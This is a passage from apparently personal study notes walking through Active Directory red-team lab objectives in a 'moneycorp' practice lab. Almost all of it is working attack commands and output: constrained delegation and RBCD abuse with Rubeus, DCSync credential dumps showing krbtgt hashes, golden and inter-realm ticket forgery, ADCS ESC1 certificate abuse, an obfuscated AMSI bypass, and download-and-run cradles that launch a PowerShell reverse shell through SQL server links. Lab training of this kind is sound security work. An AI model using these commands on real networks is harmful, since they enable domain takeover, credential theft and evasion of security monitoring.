4nmBK7MMwStZjHvFVN/SrsSP2hO5fNeKvDKfu71De3o0fnbLjqc6EvitNTAjrE8N5hgi1p232G+KC+QGVh1i+P6G0Da3xvopYMF+hcrdj6MdS9sewb8QWyFeXMk9+ev7I6qwdzUAY9XUppFFAaBAZOenLaOB8DCB7aADAgEAooHlBIHifYHfMIHcoIHZMIHWMIHToCswKaADAgESoSIEIG7FJdKXNkaTqTJ5TyKUAgbbt7JEdocWNzjmN542wBUOoREbD01PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCU1DT1JQLURDJKMHAwUAYKEAAKURGA8yMDIzMTIxODEzNTAxOVqmERgPMjAyMzEyMTgyMzUwMTlapxEYDzIwMjMxMjI1MDQyMDA4WqgRGw9NT05FWUNPUlAuTE9DQUypJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD01PTkVZQ09SUC5MT0NBTA==
```


- Now, we can run the DCSync attack from this process:


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```


**Awesome ! We escalated to Enterprise Admins too! **

***

>[!bug] Learning Objective 16
> - Enumerate users in the domain for whom Constrained Delegation is enabled.
> 	- For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
> 	- Pass the ticket and access the service.
> - Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
> 	- For such a user, request a TGT from the DC.
> 	- Use the TGS for executing the DCSync attack.
> # Solution -:



### **Task 1**

- Enumerate users with constrained delegation -:



```powershell
# Load powerview
. C:\AD\Tools\PowerView.ps1


Get-DomainUser -TrustedToAuth
```



![](https://i.imgur.com/eznsBTk.png)

> [!todo] The `TRUSTED_TO_AUTH_FOR_DELEGATION` tag must also be set under the **"useraccountcontrol :"** property 



> [!info] We already have secrets of `websvc` from `dcorp-adminsrv` machine (Check On your bookmarks to see how to do that). We can either use `Kekeo` or `Rubeus` to abuse that.



**Abuse Constrained Delegation using `websvc` with `Rubeus`**


Request **TGS** for '`websvc`' as Domain Administrator ('**Administrator**') and use it to access 'file system' on `dcorp-mssql`


```powershell
C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

- Check if the ticket was injected successfully

```powershell
klist
```


![](https://i.imgur.com/TqM14GA.png)


- Try accessing file system on dcorp-mssql

```powershell
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```


![](https://i.imgur.com/WnEumFU.png)


> [!important] Incase you wanna use `kekeo` instead of `rubeus`, check "**Abuse Constrained Delegation using websvc with Kekeo**" in lab manual


### **Task 2**

For the **next task**, enumerate the computer accounts with constrained delegation enabled using `PowerView` -:



```powershell
# Load powerview
. C:\AD\Tools\PowerView.ps1

Get-DomainComputer -TrustedToAuth
```



![](https://i.imgur.com/jYyiptn.png)



**Abuse Constrained Delegation using dcorp-adminsrv with `Rubeus`**



Run the following command from an elevated command prompt to use the obtained AES keys of `dcorp-adminsrv$` for `SafetyKatz` DCSync

```powershell
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

> [!summary] Incase you wanna extracts creds(secrets), for instance the **AES Keys**, check your bookmarks on how to do that 



- Run the below command to abuse the LDAP ticket (Perform `DcSync` attack)



```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```


**_Output -:_**


```Output
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80
```


> [!important] Incase you wanna use `kekeo` instead of `rubeus`, check "**Abuse Constrained Delegation using dcorp-adminsrv with Kekeo**" in lab manual






> [!bug] **Learning Objective 17**
> - Find a computer object in dcorp domain where we have Write permissions. 
> - Abuse the Write permissions to access that computer as Domain Admin.
> # Solution -:


- Start up a PowerShell session using **Invisi-Shell**
- Enumerate Write permissions for a user that we have compromised -:


```powershell
# Load invisi-shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Enum writes for all users
Find-InterestingDomainACL | select IdentityReferenceName, ActiveDirectoryRights

# Enum writes for a specific user
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}

# Note that the most important output from 'ActiveDirectoryRights' 
# is the 'GenericWrite', this is what we are looking for
```

![](https://i.imgur.com/y2OEHoP.png)


> [!hint] After trying from multiple users or using BloodHound we would know that the user `ciadmin` has Write permissions on the computer object of `dcorp-mgmt` (the Jenkins instance)


![](https://i.imgur.com/6rB9mxo.png)


- Let's use the reverse shell that we have and load `PowerView` there
- Go ahead and get a reverse shell as `ciadmin` with the **Jenkins** instance
- Make sure to host `sbloggingbypass.txt` on **HFS**

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.X/sbloggingbypass.txt -UseBasicParsing)
```

- Load AMSI bypass

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

- Transfer `Powerview` to the **Jenkins** instance
- Make sure to host `PowerView.ps1` on **HFS**

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```

- Establish **Resource-Based Constrained Delegation** (RBCD) on `dcorp-mgmt` for **Student VMs**, Consider Applying to All Lab Instances for Collaborative Exploration

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-stdX$' -Verbose
```


- Check if RBCD is set correctly:

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> Get-DomainRBCD
```


![](https://i.imgur.com/N5ct63j.png)

- Get AES keys of your student VM (as we configured RBCD for it above)
- Run the below command from a new `MS-DOS` session with elevated privileges




```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
```



![](https://i.imgur.com/yiMBe7G.png)



- With `Rubeus`, abuse the RBCD to access `dcorp-mgmt` as Domain Administrator - Administrator
- Also do this in the new spawned process


```powershell
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-student505$ /aes256:f1f7973b711431dd18fa189632d5a99dfd2ac53520f0acc94be75d55cd236535 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```


- Check if we can access `dcorp-mgmt`


```powershell
winrs -r:dcorp-mgmt cmd
```


![](https://i.imgur.com/WFCFcrG.png)







> [!bug] **Learning Objective 18**
> - Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to Enterprise Admin or DA to the parent domain, `moneycorp.loca`l using the domain trust key.
> # Solution -:







### **Step 1 - Retrieve Trust Key for dollarcorp and moneycrop Trust using Mimikatz or SafetyKatz.**



- Start a process with DA privileges (Run command from elevated prompt)



```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


**_Using `SafetyKatz.exe` -:_**

Execute the following commands from the process running as Domain Admin to copy `Loader.exe` to **dcorp-dc** and leverage it for extracting credentials, considering potential variations in the trust key for your lab instance

```powershell
# copy loader.exe to dcorp-dc
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# spawn interactive shell on dcorp-dc
winrs -r:dcorp-dc cmd

# set up port forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X

# Load loader.exe on memory of dcorp-dc
# Make sure to host SafetyKatz.exe on HFS first
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

# Extract credentials on the new mimikatz session
lsadump::trust /patch
```



![](https://i.imgur.com/M3Jt8fB.png)


### **Step 2 - Use the extracted information to forge a ticket**


- Forge a ticket with SID History of Enterprise Admins. Run the below command from an elevated command prompt


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-500 /rc4:a9c7b4087bf715f859361ad3c3331488 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```



> [!note] Incase you don't know the `/sids:` of the enterprise admin, we talked about it earlier during **Enumeration**, so check your bookmark 🤪




- Use the ticket with Rubeus:



```powershell
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

### **Step 3 - Try access the file system of Enterprise admin (`mcorp-dc`)**

- Check if we can access file system on `mcorp-dc`!


```powershell
dir \\mcorp-dc.moneycorp.local\c$
```


![](https://i.imgur.com/5mriKLe.png)








> [!bug] **Learning Objective 19**
> - Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to Enterprise Admin or DA to the parent domain, `moneycorp.local` using **dollarcorp's** krbtgt hash.
> # Solution -:




- We already have the krbtgt hash from **dcorp-dc** using `DCsync` attack. Let's create the inter-realm TGT and inject. Run the below command from an elevated command prompt


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-500 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```


- Let's check if we can access `mcorp-dc` -:



```powershell
dir \\mcorp-dc.moneycorp.local\c$
```



![](https://i.imgur.com/TWKp7Qz.png)


- Let's run DCSync against `mcorp-dc` to extract secrets from it


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```


**_Output -:_**

```

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:46:24 PM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c7a5135513110d108390ee6c322423f

* Primary:Kerberos-Newer-Keys *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442
      des_cbc_md5       (4096) : c20dc80d51f7abd9
```



> [!bug] **Learning Objective 20**
> - With DA privileges on `dollarcorp.moneycorp.local`, get access to `SharedwithDCorp` share on the DC of `eurocorp.local` forest.
> # Solution -:


**We first need to Retrieve Trust Key for dollarcorp and eurocorp Trust using Mimikatz or SafetyKatz**

- Start a process with DA privileges. Run command from an elevated command prompt:


```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


- Run below commands from the process running as DA to copy `Loader.exe` on **dcorp-dc** and use it to extract credentials. Note that the trust key may be different in your lab instance:


```powershell
# copy loader.exe to dcorp-dc
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# get interactive shell
winrs -r:dcorp-dc cmd

# enable port forwarding
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

# Make sure to host SafetyKatz.exe on HFS
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

# Extract credentials on the new mimikatz session
lsadump::trust /patch
```


**_Example -:_**



![](https://i.imgur.com/qORWHVc.png)



> [!note] Make sure you don't make the mistake of copying the trust key (rc4_hmac_nt), of `MONEYCORP.LOCAL` instead of `EUROCORP.LOCAL` as used in the below command "`/rc4:`", scrolling down a little bit on the command output will help





- Forge an inter-realm **TGT**. Run command from an elevated command prompt


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:ed74fa2b5cfd5ab0fb7ace3d8a7b6c04 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
```




- Now Use the ticket with `Rubeus`:





```powershell
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```





- Now Check if we can access explicitly shared resources `eurocorp-dc`


```powershell
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```



**_Example_**


![](https://i.imgur.com/2aCMqVc.png)



> [!hint] You can also use `Invoke-Mmimkatz` and `old Kekeo`, check lab manual as i won't discuss here


> [!bug] **Learning Objective 21**
> - Check if AD CS is used by the target forest and find any vulnerable/abusable templates. 
> - Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
> # Solution -:


### **Enumerate Templates**


- We can use the `Certify` tool to check for **AD CS** in `moneycorp`.


```powershell
C:\AD\Tools\Certify.exe cas
```





**_Important Output_**




![](https://i.imgur.com/2sHEFFu.png)


- We can list all the templates using the following command. Going through the output we can find some interesting templates


```powershell
C:\AD\Tools\Certify.exe find
```




**_Important Output_**




![](https://i.imgur.com/X39odqU.png)



> [!note] The template "`HTTPSCertificates`" allows enrollment to the RDPUsers group, which we are able to access




## **Privilege Escalation to DA and EA using `ESC1` The template**

### **Domain Admin**



- `HTTPSCertificates` looks interesting. Let's get some more information about it as it allows requestor to supply subject name:




```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```




**_important Output_**




![](https://i.imgur.com/VJtq7Oe.png)






> [!note] Sweet! The `HTTPSCertificates` template grants enrollment rights to `RDPUsers` group and allows requestor to supply Subject Name. Recall that `studentx` is a member of `RDPUsers` group. This means that we can request certificate for any user as `studentx` .


- Request a certificate for Domain Admin - Administrator


```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```



> [!note]
>  Copy all the text between `-----BEGIN RSA PRIVATE KEY----- `and `-----END CERTIFICATE-----` and save it to `esc1.pem`.


- Convert the obtained credentials to `PFX` format using the `openssl` binary on the student VM, using '`SecretPass`' as the export password.
- Note that you have to type the password manually



```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```



- Use the `PFX` created above with `Rubeus` to request a TGT for DA - Administrator!


```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass /ptt
```





**_Example_**




![](https://i.imgur.com/5UhVvcu.png)



- Check if we actually have DA privileges now:


```powershell
winrs -r:dcorp-dc whoami
```




**_Example_**



![](https://i.imgur.com/efsSAKN.png)



### **Enterprise Admin**



- We can use similar method to escalate to Enterprise Admin privileges. Request a certificate for Enterprise Administrator - Administrator




```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```





> [!note] 
> Difference in `/altname`, Then go ahead and save the certificate and save it as `esc1-EA.pem`.






- Now convert it to `PFX`. I will use `SecretPass` as the export password
- Don't forget to type password manually


```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```




- Use `Rubeus` to request TGT for Enterprise Administrator - Administrator


```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass /ptt
```



**_Example_**



![](https://i.imgur.com/fj7iPVu.png)


- Finally, access `mcop-dc` !!




```powershell
winrs -r:mcorp-dc cmd
```




**_Example_**



![](https://i.imgur.com/bbr0YzC.png)



> [!tip] To know how to do **Privilege Escalation to DA and EA using `ESC3` and `ESC6`**, Check Lab Manual, I only practiced it, but did not take notes, in the exam lab, make sure to refer to lab manual and check both of them






> [!bug] **Learning Objective 22**
> - Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
> # Solution -:


**We start with enumerating SQL servers in the domain and if `studentx` has privileges to connect to any of them. We can use `PowerUpSQL` module for that**

- Start up a session with `invisi-shell`

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```


- Load `PowerUpSQl`


```powershell
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
```




- Now enumerate `SQL` servers




```powershell
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```



![](https://i.imgur.com/4HTrzoo.png)


- We can then use `Get-SQLServerLinkCrawl` for crawling the database links automatically





```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```



![](https://i.imgur.com/woeljrx.png)


**Sweet! We have `sysadmin` set to `1` which means `True` on `eu-sql33` server!**


- Let try to get command execution on `eu-sql33`


```powershell
# -Instance : the first sql instance
# -Query : command to run
# -QueryTarget : our target which has all condition met


Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql33
```



**_Example Output_**



![](https://i.imgur.com/AK0H9dV.png)



- Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the `eu-sql33` instance. Remember to start a listener
- Make sure to start your **HFS** first and upload the file `sbloggingbypass.txt`, `amsibypass.txt` and `Invoke-PowerShellTcpEx.ps1` in other to host them



```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.5/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.5/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.5/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql33
```




**_Example Output_**




![](https://i.imgur.com/JlCEJkl.png)




